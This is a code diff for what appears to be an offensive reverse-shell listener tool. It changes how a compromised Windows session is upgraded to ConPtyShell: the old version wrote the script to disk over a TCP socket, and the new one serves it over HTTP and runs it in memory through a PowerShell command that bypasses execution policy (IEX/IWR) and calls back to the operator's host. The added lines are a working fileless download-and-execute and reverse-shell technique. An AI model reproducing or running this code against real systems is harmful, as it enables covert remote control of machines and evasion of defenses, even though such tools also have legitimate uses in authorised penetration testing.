@@ -12,7 +12,7 @@ import threading
 import time
 import urllib.request
 
-from koi.utils.tcp import spawn_send_server
+from koi.utils.tcp import spawn_http_server
 from typing import Dict, Optional
 
 from koi.cli import print_help
@@ -434,7 +434,7 @@ class Listener:
 
     _CONPTYSHELL_URL = (
         "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
-        "/refs/heads/master/Invoke-ConPtyShell.ps1"
+        "/master/Invoke-ConPtyShell.ps1"
     )
 
     def _upgrade_windows_conptyshell(self, sess: Session) -> None:
@@ -447,7 +447,7 @@ class Listener:
         if local_ip in ("0.0.0.0", ""):
             local_ip = "127.0.0.1"
 
-        with Spinner("Fetching ConPtyShell locally…"):
+        with Spinner("Fetching ConPtyShell…"):
             try:
                 with urllib.request.urlopen(self._CONPTYSHELL_URL, timeout=15) as resp:
                     ps1_data = resp.read()
@@ -455,37 +455,18 @@ class Listener:
                 notify('error', f"Failed to fetch ConPtyShell: {exc}")
                 return
 
-        remote_path = r"C:\Windows\Temp\Invoke-ConPtyShell.ps1"
-        upload_port, upload_thread, upload_errors = spawn_send_server(ps1_data, timeout=15)
-
-        upload_cmd = (
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{upload_port});"
-            f"$_s=$_c.GetStream();"
-            f"$_f=[IO.File]::OpenWrite('{remote_path}');"
-            f"$_b=New-Object byte[] 65536;"
-            f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
-            f"$_f.Close();$_c.Close()"
-        )
-
-        with Spinner(f"Uploading ConPtyShell ({len(ps1_data)} bytes)…"):
-            sess.send((upload_cmd + "\r\n").encode(sess.encoding, errors="replace"))
-            upload_thread.join(timeout=15)
-
-        if upload_errors:
-            notify('error', f"ConPtyShell upload failed: {upload_errors[0]}")
-            return
-
-        notify('info', f"ConPtyShell uploaded → {remote_path}")
-        time.sleep(1.0)
+        http_port, http_thread = spawn_http_server(ps1_data, timeout=60.0)
+        notify('info', f"Serving ConPtyShell in-memory on port {_b(http_port)}")
 
         invoke_cmd = (
-            f"powershell -nop -ep bypass -c \". '{remote_path}';"
+            f"powershell -nop -ep bypass -c \""
+            f"IEX(IWR 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
             f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.port}"
             f" -Rows {rows} -Cols {cols} -CommandLine powershell\""
         )
 
         notify('info',
-            f"Invoking ConPtyShell on session {_p(f'#{sess.id}')} → callback {_b(self._mask_ip(local_ip, 'local'))}:{_b(self.port)}"
+            f"Invoking ConPtyShell (in-memory) on session {_p(f'#{sess.id}')} → callback {_b(self._mask_ip(local_ip, 'local'))}:{_b(self.port)}"
         )
 
         self._pending_conpty[sess.addr[0]] = sess.os_type
@@ -508,10 +489,11 @@ class Listener:
             time.sleep(0.1)
 
         new_sess.upgraded = True
+        new_sess.is_conptyshell = True
         self._write_state()
         time.sleep(0.3)
         new_sess.conn.sendall(b"\r\n")
-        notify('success',f"ConPtyShell ready as session {_p(f'#{new_sess.id}')}. ")
+        notify('success', f"ConPtyShell ready as session {_p(f'#{new_sess.id}')}. ")
 
     def _wait_for_new_session(
         self,
@@ -727,6 +709,12 @@ class Listener:
 
     def _winch(self, sess: Session) -> None:
         if sess.os_type in ("windows_cmd", "windows_ps"):
+            if sess.is_conptyshell:
+                try:
+                    cols, rows = shutil.get_terminal_size()
+                    sess.send(f"\x08{cols}x{rows}".encode())
+                except Exception:
+                    pass
             return
         self._sync_winsize(sess)
         self._drain(sess, 0.15)
